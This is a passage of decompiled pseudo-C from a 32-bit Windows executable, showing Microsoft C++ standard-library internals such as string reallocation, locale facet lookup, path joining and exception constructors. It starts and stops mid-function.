  void **result; // eax
  unsigned int v17; // [esp+10h] [ebp-Ch]
  void *v18; // [esp+14h] [ebp-8h]
  char *v19; // [esp+14h] [ebp-8h]
  size_t Size; // [esp+18h] [ebp-4h]
  _BYTE *Sizea; // [esp+18h] [ebp-4h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_409070();
  v7 = (unsigned int)Src[5];
  v18 = (void *)(v6 + a2);
  v8 = (v6 + a2) | 0xF;
  v17 = v7;
  if ( v8 <= 0x7FFFFFFF )
  {
    if ( v7 <= 0x7FFFFFFF - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 0x7FFFFFFF;
    }
  }
  else
  {
    v8 = 0x7FFFFFFF;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
    {
      v13 = operator new(__CFADD__(v8, 1) ? -1 : v8 + 1);
      v6 = Size;
      v12 = v13;
    }
    else
    {
      v12 = 0;
    }
  }
  else
  {
    v10 = v9 + 35;
    if ( v9 + 35 <= v9 )
      v10 = -1;
    v11 = operator new(v10);
    if ( !v11 )
      goto LABEL_23;
    v6 = Size;
    v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
    *(v12 - 1) = v11;
  }
  Src[4] = v18;
  Src[5] = (void *)v8;
  v14 = (char *)v12 + v6;
  v19 = (char *)v12 + v6;
  Sizea = (char *)v12 + v6 + a5;
  if ( v17 >= 0x10 )
  {
    v15 = *Src;
    memmove_0(v12, *Src, v6);
    memmove_0(v19, a4, a5);
    *Sizea = 0;
    if ( v17 + 1 < 0x1000 )
    {
LABEL_20:
      sub_40FBF3(v15);
      *Src = v12;
      return Src;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove_0(v12, Src, v6);
  memmove_0(v14, a4, a5);
  *Sizea = 0;
  result = Src;
  *Src = v12;
  return result;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (00406520) --------------------------------------------------------
void **__thiscall sub_406520(void **Src, unsigned int a2, int a3, size_t a4, char a5)
{
  size_t v6; // edx
  unsigned int v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // esi
  _DWORD *v13; // eax
  char *v14; // edi
  void *v15; // edi
  void **result; // eax
  char *v17; // [esp+Ch] [ebp-10h]
  unsigned int v18; // [esp+10h] [ebp-Ch]
  size_t v19; // [esp+14h] [ebp-8h]
  _BYTE *v20; // [esp+14h] [ebp-8h]
  size_t Size; // [esp+18h] [ebp-4h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_409070();
  v7 = (unsigned int)Src[5];
  v19 = v6 + a2;
  v8 = (v6 + a2) | 0xF;
  v18 = v7;
  if ( v8 <= 0x7FFFFFFF )
  {
    if ( v7 <= 0x7FFFFFFF - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 0x7FFFFFFF;
    }
  }
  else
  {
    v8 = 0x7FFFFFFF;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
    {
      v13 = operator new(__CFADD__(v8, 1) ? -1 : v8 + 1);
      v6 = Size;
      v12 = v13;
    }
    else
    {
      v12 = 0;
    }
  }
  else
  {
    v10 = v9 + 35;
    if ( v9 + 35 <= v9 )
      v10 = -1;
    v11 = operator new(v10);
    if ( !v11 )
      goto LABEL_23;
    v6 = Size;
    v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
    *(v12 - 1) = v11;
  }
  Src[4] = (void *)v19;
  Src[5] = (void *)v8;
  v14 = (char *)v12 + v6;
  v17 = (char *)v12 + v6;
  v20 = (char *)v12 + v6 + a4;
  if ( v18 >= 0x10 )
  {
    v15 = *Src;
    memmove_0(v12, *Src, v6);
    memset(v17, a5, a4);
    *v20 = 0;
    if ( v18 + 1 < 0x1000 )
    {
LABEL_20:
      sub_40FBF3(v15);
      *Src = v12;
      return Src;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove_0(v12, Src, v6);
  memset(v14, a5, a4);
  *v20 = 0;
  result = Src;
  *Src = v12;
  return result;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (00406680) --------------------------------------------------------
_DWORD *__thiscall sub_406680(_DWORD *Src, unsigned int a2, int a3, unsigned int a4, unsigned __int16 a5)
{
  int v6; // edx
  int v7; // eax
  unsigned int v8; // edx
  unsigned int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // edx
  size_t v12; // eax
  void *v13; // eax
  _DWORD *v14; // esi
  char *v15; // edi
  void *v16; // ebx
  char *v17; // edi
  int i; // ecx
  _DWORD *result; // eax
  char *v20; // edi
  int j; // ecx
  size_t v22; // [esp-4h] [ebp-20h]
  int v24; // [esp+10h] [ebp-Ch]
  unsigned int v25; // [esp+14h] [ebp-8h]
  int v26; // [esp+18h] [ebp-4h]

  v6 = Src[4];
  v26 = v6;
  if ( 2147483646 - v6 < a2 )
    sub_409070();
  v7 = v6 + a2;
  v8 = Src[5];
  v24 = v7;
  v9 = v7 | 7;
  v25 = v8;
  if ( (v7 | 7u) <= 0x7FFFFFFE )
  {
    if ( v8 <= 2147483646 - (v8 >> 1) )
    {
      if ( v9 < v8 + (v8 >> 1) )
        v9 = v8 + (v8 >> 1);
    }
    else
    {
      v9 = 2147483646;
    }
  }
  else
  {
    v9 = 2147483646;
  }
  v10 = __CFADD__(v9, 1) ? -1 : v9 + 1;
  v11 = 2 * v10;
  if ( v10 <= 0x7FFFFFFF )
  {
    if ( v11 < 0x1000 )
    {
      if ( v11 )
        v14 = operator new(2 * v10);
      else
        v14 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v11 = -1;
  }
  v12 = v11 + 35;
  if ( v11 + 35 <= v11 )
    v12 = -1;
  v13 = operator new(v12);
  if ( !v13 )
    goto LABEL_33;
  v14 = (_DWORD *)(((unsigned int)v13 + 35) & 0xFFFFFFE0);
  *(v14 - 1) = v13;
LABEL_18:
  Src[4] = v24;
  Src[5] = v9;
  v22 = 2 * v26;
  v15 = (char *)v14 + 2 * v26;
  if ( v25 >= 8 )
  {
    v16 = (void *)*Src;
    memmove_0(v14, v16, v22);
    if ( a4 )
    {
      memset32(v15, (a5 << 16) | a5, a4 >> 1);
      v17 = &v15[4 * (a4 >> 1)];
      for ( i = a4 & 1; i; --i )
      {
        *(_WORD *)v17 = a5;
        v17 += 2;
      }
    }
    *((_WORD *)v14 + a4 + v26) = 0;
    if ( 2 * v25 + 2 < 0x1000 )
      goto LABEL_26;
    if ( (unsigned int)v16 - *((_DWORD *)v16 - 1) - 4 <= 0x1F )
    {
      v16 = (void *)*((_DWORD *)v16 - 1);
LABEL_26:
      sub_40FBF3(v16);
      result = Src;
      *Src = v14;
      return result;
    }
LABEL_33:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove_0(v14, Src, v22);
  if ( a4 )
  {
    memset32(v15, (a5 << 16) | a5, a4 >> 1);
    v20 = &v15[4 * (a4 >> 1)];
    for ( j = a4 & 1; j; --j )
    {
      *(_WORD *)v20 = a5;
      v20 += 2;
    }
  }
  *((_WORD *)v14 + v26 + a4) = 0;
  result = Src;
  *Src = v14;
  return result;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (00406820) --------------------------------------------------------
void **__thiscall sub_406820(void **Src, char *Srca)
{
  void **v2; // ebx
  char *v3; // ecx
  _DWORD *v4; // edx
  unsigned int v5; // esi
  char *v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // esi
  unsigned int v9; // eax
  int v10; // esi
  void **v11; // edi
  unsigned int v12; // ecx
  void **v13; // eax
  void **v14; // eax
  void *v15; // ecx
  unsigned int v16; // eax
  void **v17; // ecx
  void **v18; // ecx
  void **v19; // eax
  void **v20; // eax
  void **v21; // eax
  void *v22; // ecx
  int v24; // [esp+10h] [ebp-30h]
  void **v25; // [esp+10h] [ebp-30h]
  int v27; // [esp+14h] [ebp-2Ch]
  void *Block[4]; // [esp+18h] [ebp-28h] BYREF
  unsigned int v29; // [esp+28h] [ebp-18h]
  unsigned int v30; // [esp+2Ch] [ebp-14h]
  int v31; // [esp+3Ch] [ebp-4h]

  v2 = Src;
  v3 = Srca;
  v4 = Srca;
  v5 = *((_DWORD *)Srca + 5);
  if ( v5 >= 8 )
    v4 = *(_DWORD **)Srca;
  v6 = (char *)v4 + 2 * *((_DWORD *)Srca + 4);
  if ( v5 >= 8 )
    v3 = *(char **)Srca;
  v7 = 0;
  v29 = 0;
  v8 = 7;
  v30 = 7;
  LOWORD(Block[0]) = 0;
  if ( v3 != v6 )
  {
    v9 = (v6 - v3) >> 1;
    if ( v9 > 7 )
    {
      LOBYTE(v24) = 0;
      sub_405DD0(Block, v9, v24, v3);
    }
    else
    {
      v10 = 2 * v9;
      v29 = v9;
      memmove(Block, v3, 2 * v9);
      *(_WORD *)((char *)Block + v10) = 0;
    }
    v7 = v29;
    v8 = v30;
  }
  v11 = (void **)Block[0];
  v12 = 0;
  v31 = 0;
  if ( v7 )
  {
    do
    {
      v13 = Block;
      if ( v8 >= 8 )
        v13 = v11;
      if ( *((_WORD *)v13 + v12) == 47 )
      {
        v14 = Block;
        if ( v8 >= 8 )
          v14 = v11;
        *((_WORD *)v14 + v12) = 92;
        v8 = v30;
        v7 = v29;
        v11 = (void **)Block[0];
      }
      ++v12;
    }
    while ( v12 < v7 );
    v2 = Src;
  }
  v15 = v2[4];
  if ( v15 && v7 )
  {
    v16 = (unsigned int)v2[5];
    v25 = v2;
    if ( v16 >= 8 )
      v25 = (void **)*v2;
    v27 = 2 * (_DWORD)v15;
    v11 = (void **)Block[0];
    if ( *((_WORD *)v25 + (_DWORD)v15 - 1) != 58 )
    {
      v17 = v2;
      if ( v16 >= 8 )
        v17 = (void **)*v2;
      v11 = (void **)Block[0];
      if ( *(_WORD *)((char *)v17 + v27 - 2) != 47 )
      {
        v18 = v2;
        if ( v16 >= 8 )
          v18 = (void **)*v2;
        if ( *(_WORD *)((char *)v18 + v27 - 2) != 92 )
        {
          v19 = Block;
          if ( v8 >= 8 )
            v19 = (void **)Block[0];
          if ( *(_WORD *)v19 != 47 )
          {
            v20 = Block;
            if ( v8 >= 8 )
              v20 = (void **)Block[0];
            if ( *(_WORD *)v20 != 92 )
            {
              sub_4091C0(v2, 1u, 0x5Cu);
              v8 = v30;
              v7 = v29;
              v11 = (void **)Block[0];
            }
          }
        }
      }
    }
  }
  v21 = Block;
  if ( v8 >= 8 )
    v21 = v11;
  sub_409240(v2, v21, v7);
  if ( v30 >= 8 )
  {
    v22 = Block[0];
    if ( 2 * v30 + 2 >= 0x1000 )
    {
      v22 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v22 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v22);
  }
  return v2;
}
// 4068B3: variable 'v24' is possibly undefined

//----- (00406A10) --------------------------------------------------------
_DWORD *__cdecl sub_406A10(int a1)
{
  char v1; // bl
  unsigned int v2; // edi
  int v3; // ecx
  _DWORD *v4; // esi
  int v5; // eax
  int v6; // ecx
  char *v7; // eax
  char v9[52]; // [esp+10h] [ebp-54h] BYREF
  int v10; // [esp+44h] [ebp-20h]
  void *Block; // [esp+48h] [ebp-1Ch]
  char v12[4]; // [esp+4Ch] [ebp-18h] BYREF
  int v13; // [esp+50h] [ebp-14h] BYREF
  int v14; // [esp+60h] [ebp-4h]

  v1 = 0;
  v10 = a1;
  v13 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)&v13, 0);
  v2 = dword_509584;
  v14 = 0;
  Block = (void *)dword_5095B8;
  if ( !dword_509584 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v12, 0);
    if ( !dword_509584 )
      dword_509584 = ++dword_509694;
    std::_Lockit::~_Lockit((std::_Lockit *)v12);
    v2 = dword_509584;
  }
  v3 = *(_DWORD *)(a1 + 4);
  if ( v2 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v3 + 8) + 4 * v2);
    if ( v4 )
      goto LABEL_25;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_40EBBD();
  if ( v2 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v5 + 8) + 4 * v2);
LABEL_12:
    if ( v4 )
      goto LABEL_25;
  }
  if ( Block )
  {
    v4 = Block;
  }
  else
  {
    v4 = operator new(8u);
    Block = v4;
    LOBYTE(v14) = 1;
    if ( v4 )
    {
      v6 = *(_DWORD *)(v10 + 4);
      if ( v6 )
      {
        v7 = *(char **)(v6 + 24);
        if ( !v7 )
          v7 = (char *)(v6 + 28);
      }
      else
      {
        v7 = (char *)Locale;
      }
      sub_406F00((struct std::_Locinfo *)v9, v7);
      v1 = 1;
      v4[1] = 0;
      *v4 = &std::codecvt<char,char,_Mbstatet>::`vftable';
    }
    else
    {
      v4 = 0;
    }
    LOBYTE(v14) = 0;
    if ( (v1 & 1) != 0 )
      sub_407630((std::_Lockit *)v9);
    dword_5095B8 = (int)v4;
    (*(void (__thiscall **)(_DWORD *))(*v4 + 4))(v4);
    std::_Facet_Register((struct std::_Facet_base *)v4);
  }
LABEL_25:
  std::_Lockit::~_Lockit((std::_Lockit *)&v13);
  return v4;
}
// 42E8A0: using guessed type void *std::codecvt<char,char,_Mbstatet>::`vftable';
// 5095B8: using guessed type int dword_5095B8;
// 509694: using guessed type int dword_509694;
// 406A10: using guessed type char var_18[4];

//----- (00406B80) --------------------------------------------------------
char *__cdecl sub_406B80(int a1)
{
  unsigned int v1; // edi
  int v2; // ecx
  char *v3; // esi
  int v4; // eax
  int v5; // ecx
  char *v6; // eax
  char v8[52]; // [esp+Ch] [ebp-68h] BYREF
  _Ctypevec v9; // [esp+40h] [ebp-34h] BYREF
  int v10; // [esp+50h] [ebp-24h]
  void *Block; // [esp+54h] [ebp-20h]
  int v12; // [esp+58h] [ebp-1Ch]
  char v13[4]; // [esp+5Ch] [ebp-18h] BYREF
  char v14[4]; // [esp+60h] [ebp-14h] BYREF
  int v15; // [esp+70h] [ebp-4h]

  v10 = a1;
  v12 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)v13, 0);
  v1 = dword_5096A8;
  v15 = 0;
  Block = (void *)dword_509590;
  if ( !dword_5096A8 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v14, 0);
    if ( !dword_5096A8 )
      dword_5096A8 = ++dword_509694;
    std::_Lockit::~_Lockit((std::_Lockit *)v14);
    v1 = dword_5096A8;
  }
  v2 = *(_DWORD *)(a1 + 4);
  if ( v1 >= *(_DWORD *)(v2 + 12) )
  {
    v3 = 0;
  }
  else
  {
    v3 = *(char **)(*(_DWORD *)(v2 + 8) + 4 * v1);
    if ( v3 )
      goto LABEL_25;
  }
  if ( !*(_BYTE *)(v2 + 20) )
    goto LABEL_12;
  v4 = sub_40EBBD();
  if ( v1 < *(_DWORD *)(v4 + 12) )
  {
    v3 = *(char **)(*(_DWORD *)(v4 + 8) + 4 * v1);
LABEL_12:
    if ( v3 )
      goto LABEL_25;
  }
  if ( Block )
  {
    v3 = (char *)Block;
  }
  else
  {
    v3 = (char *)operator new(0x18u);
    Block = v3;
    LOBYTE(v15) = 1;
    if ( v3 )
    {
      v5 = *(_DWORD *)(v10 + 4);
      if ( v5 )
      {
        v6 = *(char **)(v5 + 24);
        if ( !v6 )
          v6 = (char *)(v5 + 28);
      }
      else
      {
        v6 = (char *)Locale;
      }
      sub_406F00((struct std::_Locinfo *)v8, v6);
      v12 = 1;
      *((_DWORD *)v3 + 1) = 0;
      *(_DWORD *)v3 = &std::ctype<char>::`vftable';
      *(_Ctypevec *)(v3 + 8) = *_Getctype(&v9);
    }
    else
    {
      v3 = 0;
    }
    LOBYTE(v15) = 0;
    if ( (v12 & 1) != 0 )
      sub_407630((std::_Lockit *)v8);
    dword_509590 = (int)v3;
    (*(void (__thiscall **)(char *))(*(_DWORD *)v3 + 4))(v3);
    std::_Facet_Register((struct std::_Facet_base *)v3);
  }
LABEL_25:
  std::_Lockit::~_Lockit((std::_Lockit *)v13);
  return v3;
}
// 42E4C8: using guessed type void *std::ctype<char>::`vftable';
// 509590: using guessed type int dword_509590;
// 509694: using guessed type int dword_509694;
// 406B80: using guessed type char var_18[4];
// 406B80: using guessed type char var_14[4];

//----- (00406D10) --------------------------------------------------------
_DWORD *__thiscall sub_406D10(_DWORD *this, _DWORD *Src)
{
  _OWORD *v2; // ebx
  unsigned int v4; // ecx
  _DWORD *result; // eax
  int v6; // edi
  size_t v7; // eax
  void *v8; // eax
  _DWORD *v9; // ecx
  unsigned int v10; // [esp+Ch] [ebp-4h]

  v2 = Src;
  this[4] = 0;
  this[5] = 0;
  v4 = Src[4];
  v10 = v4;
  if ( Src[5] >= 0x10u )
    v2 = (_OWORD *)*Src;
  if ( v4 >= 0x10 )
  {
    v6 = v4 | 0xF;
    if ( (v4 | 0xF) > 0x7FFFFFFF )
      v6 = 0x7FFFFFFF;
    if ( (unsigned int)(v6 + 1) < 0x1000 )
    {
      if ( v6 == -1 )
        v9 = 0;
      else
        v9 = operator new(v6 + 1);
    }
    else
    {
      v7 = v6 + 36;
      if ( v6 + 36 <= (unsigned int)(v6 + 1) )
        v7 = -1;
      v8 = operator new(v7);
      if ( !v8 )
        _invalid_parameter_noinfo_noreturn();
      v9 = (_DWORD *)(((unsigned int)v8 + 35) & 0xFFFFFFE0);
      *(v9 - 1) = v8;
    }
    *this = v9;
    memmove_0(v9, v2, v10 + 1);
    this[4] = v10;
    result = this;
    this[5] = v6;
  }
  else
  {
    result = this;
    *(_OWORD *)this = *v2;
    this[4] = v4;
    this[5] = 15;
  }
  return result;
}

//----- (00406DE0) --------------------------------------------------------
void **__thiscall sub_406DE0(void **this, void *Src)
{
  this[4] = 0;
  this[5] = (void *)15;
  *(_BYTE *)this = 0;
  sub_4093F0(this, Src, strlen((const char *)Src));
  return this;
}

//----- (00406E20) --------------------------------------------------------
_DWORD *__thiscall sub_406E20(_DWORD *this, _DWORD *Src)
{
  _OWORD *v3; // edi
  unsigned int v4; // eax
  _DWORD *result; // eax
  int v6; // ebx
  unsigned int v7; // ecx
  size_t v8; // eax
  void *v9; // eax
  _DWORD *v10; // ecx
  unsigned int v11; // [esp+Ch] [ebp-4h]

  v3 = Src;
  this[4] = 0;
  this[5] = 0;
  v4 = Src[4];
  v11 = v4;
  if ( Src[5] >= 8u )
    v3 = (_OWORD *)*Src;
  if ( v4 < 8 )
  {
    *(_OWORD *)this = *v3;
    this[4] = v4;
    result = this;
    this[5] = 7;
    return result;
  }
  v6 = v4 | 7;
  if ( (v4 | 7) > 0x7FFFFFFE )
    v6 = 2147483646;
  v7 = 2 * (v6 + 1);
  if ( (unsigned int)(v6 + 1) > 0x7FFFFFFF )
  {
    v7 = -1;
LABEL_10:
    v8 = v7 + 35;
    if ( v7 + 35 <= v7 )
      v8 = -1;
    v9 = operator new(v8);
    if ( !v9 )
      _invalid_parameter_noinfo_noreturn();
    v10 = (_DWORD *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
    *(v10 - 1) = v9;
    goto LABEL_17;
  }
  if ( v7 >= 0x1000 )
    goto LABEL_10;
  if ( v7 )
    v10 = operator new(2 * (v6 + 1));
  else
    v10 = 0;
LABEL_17:
  *this = v10;
  memmove_0(v10, v3, 2 * v11 + 2);
  this[4] = v11;
  result = this;
  this[5] = v6;
  return result;
}

//----- (00406F00) --------------------------------------------------------
struct std::_Locinfo *__thiscall sub_406F00(struct std::_Locinfo *this, char *Locale)
{
  char pExceptionObject[12]; // [esp+8h] [ebp-1Ch] BYREF
  std::_Lockit *v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  v5 = this;
  std::_Lockit::_Lockit(this, 0);
  v6 = 0;
  *((_DWORD *)this + 1) = 0;
  *((_BYTE *)this + 8) = 0;
  *((_DWORD *)this + 3) = 0;
  *((_BYTE *)this + 16) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_WORD *)this + 12) = 0;
  *((_DWORD *)this + 7) = 0;
  *((_WORD *)this + 16) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_BYTE *)this + 40) = 0;
  *((_DWORD *)this + 11) = 0;
  *((_BYTE *)this + 48) = 0;
  LOBYTE(v6) = 6;
  if ( !Locale )
  {
    sub_407360(pExceptionObject, (int)"bad locale name");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVruntime_error_std__);
  }
  std::_Locinfo::_Locinfo_ctor(this, Locale);
  return this;
}

//----- (00406FC0) --------------------------------------------------------
char *__thiscall sub_406FC0(char *this, int a2, int a3, _DWORD *Src)
{
  int *v5; // eax
  int v6; // ecx
  void *v7; // edx
  void *v8; // ecx
  unsigned int v9; // edx
  char *result; // eax
  __int128 v11; // [esp-18h] [ebp-40h] BYREF
  __int64 v12; // [esp-8h] [ebp-30h]
  void *Block[6]; // [esp+4h] [ebp-24h] BYREF
  int v14; // [esp+1Ch] [ebp-Ch] BYREF
  char *v15; // [esp+20h] [ebp-8h]

  v15 = this;
  sub_406D10(&v11, Src);
  v5 = (int *)sub_408DF0((int)Block, a2, a3, v11, v12);
  v6 = (int)v5;
  if ( (unsigned int)v5[5] >= 0x10 )
    v6 = *v5;
  *(_DWORD *)this = &std::exception::`vftable';
  v14 = v6;
  HIDWORD(v12) = this + 4;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v15) = 1;
  __std_exception_copy(&v14, HIDWORD(v12));
  v7 = Block[5];
  *(_DWORD *)this = &std::runtime_error::`vftable';
  if ( (unsigned int)v7 >= 0x10 )
  {
    v8 = Block[0];
    v9 = (unsigned int)v7 + 1;
    if ( v9 >= 0x1000 )
    {
      v8 = (void *)*((_DWORD *)Block[0] - 1);
      v9 += 35;
      if ( (unsigned int)(Block[0] - v8 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v12) = v9;
    sub_40FBF3(v8);
  }
  result = this;
  *((_DWORD *)this + 3) = a2;
  *((_DWORD *)this + 4) = a3;
  *(_DWORD *)this = &std::_System_error::`vftable';
  return result;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E49C: using guessed type void *std::runtime_error::`vftable';
// 42E514: using guessed type void *std::_System_error::`vftable';

//----- (00407090) --------------------------------------------------------
char *__thiscall sub_407090(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  return this;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E514: using guessed type void *std::_System_error::`vftable';

//----- (004070E0) --------------------------------------------------------
char *__thiscall sub_4070E0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  return this;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';

//----- (00407110) --------------------------------------------------------
char *__thiscall sub_407110(char *this, int a2)
{
  char *result; // eax

  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  result = this;
  *(_DWORD *)this = &std::ios_base::failure::`vftable';
  return result;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E514: using guessed type void *std::_System_error::`vftable';
// 42E5C8: using guessed type void *std::ios_base::failure::`vftable';

//----- (00407160) --------------------------------------------------------
char *__thiscall sub_407160(char *this, char *Src, int *a3)
{
  int v4; // edi
  int v5; // ebx
  void *v6; // ecx
  void *Block[5]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v9; // [esp+24h] [ebp-14h]
  char *v10; // [esp+28h] [ebp-10h]
  int v11; // [esp+34h] [ebp-4h]

  v10 = this;
  Block[4] = 0;
  v9 = 15;
  v4 = *a3;
  v5 = a3[1];
  LOBYTE(Block[0]) = 0;
  v10 = Src + 1;
  sub_4093F0(Block, Src, strlen(Src));
  v11 = 0;
  sub_406FC0(this, v4, v5, Block);
  if ( v9 >= 0x10 )
  {
    v6 = Block[0];
    if ( v9 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v6);
  }
  *(_DWORD *)this = &std::ios_base::failure::`vftable';
  return this;
}
// 42E5C8: using guessed type void *std::ios_base::failure::`vftable';

//----- (00407230) --------------------------------------------------------
char *__thiscall sub_407230(char *this, _DWORD *a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 1, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = a2[3];
  *((_DWORD *)this + 4) = a2[4];
  *(_DWORD *)this = &std::experimental::filesystem::v1::filesystem_error::`vftable';
  sub_406E20((_DWORD *)this + 5, a2 + 5);
  sub_406E20((_DWORD *)this + 11, a2 + 11);
  return this;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E514: using guessed type void *std::_System_error::`vftable';
// 42E644: using guessed type void *std::experimental::filesystem::v1::filesystem_error::`vftable';

//----- (004072D0) --------------------------------------------------------
int __thiscall sub_4072D0(int this, _DWORD *Src, int a3, int a4)
{
  sub_406FC0((char *)this, a3, a4, Src);
  *(_DWORD *)this = &std::experimental::filesystem::v1::filesystem_error::`vftable';
  *(_DWORD *)(this + 36) = 0;
  *(_DWORD *)(this + 40) = 7;
  *(_WORD *)(this + 20) = 0;
  *(_DWORD *)(this + 60) = 0;
  *(_DWORD *)(this + 64) = 7;
  *(_WORD *)(this + 44) = 0;
  return this;
}
// 42E644: using guessed type void *std::experimental::filesystem::v1::filesystem_error::`vftable';

//----- (00407320) --------------------------------------------------------
char *__thiscall sub_407320(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E49C: using guessed type void *std::runtime_error::`vftable';

//----- (00407360) --------------------------------------------------------
char *__thiscall sub_407360(char *this, int a2)
{
  int v4; // [esp+4h] [ebp-Ch] BYREF
  char *v5; // [esp+8h] [ebp-8h]

  v5 = this;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  v4 = a2;
  LOBYTE(v5) = 1;
  __std_exception_copy(&v4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E49C: using guessed type void *std::runtime_error::`vftable';

//----- (004073C0) --------------------------------------------------------
char *__thiscall sub_4073C0(char *this, int a2)
{
  char *result; // eax

  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  result = this;
  *(_DWORD *)this = &std::system_error::`vftable';
  return result;
}
// 41170B: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E514: using guessed type void *std::_System_error::`vftable';
// 42E524: using guessed type void *std::system_error::`vftable';

//----- (00407490) --------------------------------------------------------
void __thiscall sub_407490(int this)
{
  bool v2; // zf
  _DWORD *v3; // edi
  int v4; // edx
  int v5; // ecx
  _DWORD *v6; // esi
  int v7; // ecx
  void (__thiscall ***v8)(_DWORD, int); // eax

  v2 = *(_DWORD *)(this + 76) == 0;
  *(_DWORD *)this = &std::filebuf::`vftable';
  if ( !v2 )
  {
    v3 = *(_DWORD **)(this + 12);
    if ( *v3 == this + 60 )
    {
